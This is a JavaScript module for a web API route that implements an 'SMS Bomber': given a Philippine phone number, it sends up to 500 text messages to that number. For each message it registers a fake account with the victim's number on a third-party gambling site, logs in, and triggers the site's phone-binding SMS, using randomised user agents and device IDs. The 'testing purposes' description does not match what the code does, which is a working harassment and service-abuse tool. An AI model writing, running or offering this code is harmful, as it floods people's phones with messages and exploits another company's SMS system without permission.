const axios = require("axios");
const randomUseragent = require("random-useragent");

module.exports = {
  meta: {
    name: "SMS Bomber",
    description: "Send bulk SMS to a target phone number for testing purposes",
    author: "Jay Bohol",
    version: "1.0.0",
    category: "tools",
    method: "GET",
    path: "/smsbomber"
  },
  
  onStart: async function({ req, res }) {
    try {
      let { phone, times } = req.query;
      times = parseInt(times, 10) || 100;
      
      // Validate and format phone number
      if (phone.startsWith("+63")) {
        phone = phone.slice(3);
      } else if (phone.startsWith("63")) {
        phone = phone.slice(2);
      } else if (phone.startsWith("0")) {
        phone = phone.slice(1);
      }
      
      // Check if phone number is valid (10 digits)
      if (!phone || !/^\d{10}$/.test(phone)) {
        return res.status(400).json({
          status: false,
          error: "Invalid phone number. Please use PH number format: +63, 63, 09, or 9 followed by 10 digits"
        });
      }
      
      // Rate limit check (optional)
      if (times > 500) {
        return res.status(400).json({
          status: false,
          error: "Maximum SMS limit is 500 per request"
        });
      }
      
      console.log(`📨 Starting SMS bombing to ${phone} (${times} times)...`);
      
      let successCount = 0;
      let failCount = 0;
      const errors = [];
      
      // Send SMS in batches to avoid overwhelming the system
      const batchSize = 10;
      const batches = Math.ceil(times / batchSize);
      
      for (let batch = 0; batch < batches; batch++) {
        const batchStart = batch * batchSize;
        const batchEnd = Math.min(batchStart + batchSize, times);
        const batchPromises = [];
        
        for (let i = batchStart; i < batchEnd; i++) {
          batchPromises.push(sendSingleSms(phone, i + 1));
        }
        
        const results = await Promise.allSettled(batchPromises);
        
        results.forEach(result => {
          if (result.status === 'fulfilled' && result.value.success) {
            successCount++;
          } else {
            failCount++;
            if (result.reason) {
              errors.push(result.reason);
            }
          }
        });
        
        // Small delay between batches to prevent rate limiting
        if (batch < batches - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
      
      res.json({
        status: true,
        message: `SMS bombing completed`,
        target: phone,
        requested: times,
        details: {
          success: successCount,
          failed: failCount,
          success_rate: `${((successCount / times) * 100).toFixed(2)}%`
        },
        author: "Kenneth Panio",
        timestamp: new Date().toISOString()
      });
      
    } catch (error) {
      console.error("SMS Bomber Error:", error.message);
      
      res.status(500).json({
        status: false,
        error: "Failed to complete SMS bombing",
        details: error.message,
        author: "Kenneth Panio"
      });
    }
  }
};

// Helper functions
const generateRandomString = (length) => {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
};

const generateUuidDeviceId = () => {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
};

const createAccount = async (username, password, phone) => {
  try {
    const { data } = await axios.post(
      "https://slotmax.vip/api/user/custom/register",
      {
        username,
        password,
        code: Date.now(),
        phone,
        areaCode: "63"
      },
      {
        headers: {
          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
          "Accept": "application/json, text/plain, */*",
          "Content-Type": "application/json",
          "requestfrom": "H5",
          "deviceid": generateUuidDeviceId(),
          "referer": `https://slotmax.vip/game`
        },
        timeout: 10000
      }
    );
    return data;
  } catch (error) {
    console.error("Account creation error:", error.response?.data || error.message);
    return null;
  }
};

const login = async (username, password) => {
  try {
    const { headers } = await axios.post(
      "https://slotmax.vip/api/user/login",
      {
        username,
        password
      },
      {
        headers: {
          "Content-Type": "application/json",
          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
        },
        timeout: 10000
      }
    );
    return headers["set-cookie"]?.[0] || null;
  } catch (error) {
    console.error("Login error:", error.response?.data || error.message);
    return null;
  }
};

const sendSms = async (cookie, phone) => {
  try {
    const { data } = await axios.post(
      "https://slotmax.vip/api/user/sms/send/bind",
      {
        phone,
        areaCode: "63"
      },
      {
        headers: {
          "Content-Type": "application/json",
          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
          cookie,
        },
        timeout: 15000
      }
    );
    return data;
  } catch (error) {
    console.error("SMS send error:", error.response?.data || error.message);
    return null;
  }
};

const sendSingleSms = async (phone, attemptNumber) => {
  try {
    const username = generateRandomString(12);
    const password = generateRandomString(16);
    
    const account = await createAccount(username, password, phone);
    if (!account) {
      return { success: false, error: "Account creation failed" };
    }
    
    const cookie = await login(username, password);
    if (!cookie) {
      return { success: false, error: "Login failed" };
    }
    
    const result = await sendSms(cookie, phone);
    if (result?.success) {
      console.log(`✅ SMS ${attemptNumber} sent successfully.`);
      return { success: true };
    } else {
      console.log(`❌ SMS ${attemptNumber} failed.`);
      return { success: false, error: result?.message || "SMS send failed" };
    }
  } catch (error) {
    console.error(`❌ SMS ${attemptNumber} error:`, error.message);
    return { success: false, error: error.message };
  }
};
